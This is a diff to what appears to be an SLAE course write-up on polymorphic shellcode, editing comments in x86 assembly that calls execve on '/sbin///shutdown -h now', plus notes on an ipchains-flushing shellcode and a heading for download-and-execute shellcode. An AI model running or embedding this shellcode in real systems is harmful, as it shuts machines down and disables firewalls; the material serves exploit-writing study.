@@ -72,37 +72,24 @@ return 0;
 }
 ```
 
-I extracted the assembly code and modified it manually:
+I extracted the assembly code and modified it manually. The comments prefixed with `[M]` indicates that the instruction has been modified.
 
 ```asm
-;---------------------------------
-;
-; Author: dubs3c
-;
-; Purpose:
-; Create a polymorphic version of
-; "shutdown -h now Shellcode" from
-; shell-storm.org
-;
-; SLAE Assignment 6
-;
-;----------------------------------
-
 global _start
 
 section .text
 
 _start:
 
-    xor    ecx,ecx                      ; clear ecx
-    mul    ecx                          ; clear both eax and edx
-    push   edx                          ; push edx instead of eax
+    xor    ecx,ecx                      ; [M] clear ecx
+    mul    ecx                          ; [M] clear both eax and edx
+    push   edx                          ; [M] push edx instead of eax
     push word 0x682d                    ; -h option
     mov    edi,esp                      ; save stack pointer to edi
     push   eax                          ; push null
     push byte 0x6e                      ; "n" character
-    mov byte [esp+1], 0x6f              ; "o" character
-    mov byte [esp+2], 0x77              ; "w" character
+    mov byte [esp+1], 0x6f              ; [M] "o" character
+    mov byte [esp+2], 0x77              ; [M] "w" character
     mov    edi,esp                      ; save stack pointer to edi
     push   eax                          ; push null
     push   0x6e776f64                   ; these four push instructions correspond to /sbin///shutdown
@@ -115,7 +102,7 @@ _start:
     push   edi                          ; points to "-h now"
     push   ebx                          ; points to /sbin///shutdown
     mov    ecx,esp                      ; save stack pointer to ecx
-    mov    al,0xc-1                     ; 0xc - 1 = 0xb which is execve() syscall
+    mov    al,0xc-1                     ; [M] 0xc - 1 = 0xb which is execve() syscall
     int    0x80                         ; Execute syscall
 ```
 
@@ -179,7 +166,7 @@ main()
 }
 ```
 
-Because I don't have the command `ipchains` on my system, I cheated a little bit att created the following script in `/sbin/ipchains`:
+Because I don't have the command `ipchains` on my system, I cheated a little bit and created the following script in `/sbin/ipchains`:
 
 ```bash
 #!/bin/bash
@@ -247,7 +234,7 @@ Chain OUTPUT (policy ACCEPT)
 target     prot opt source               destination
 ```
 
-The modified shellcode increased with 17 bytes which is still under 50% increase.
+The modified shellcode increased with 17 bytes which is a 42% increase.
 
 ## Shellcode 3: Download + chmod + exec - 108 bytes
 
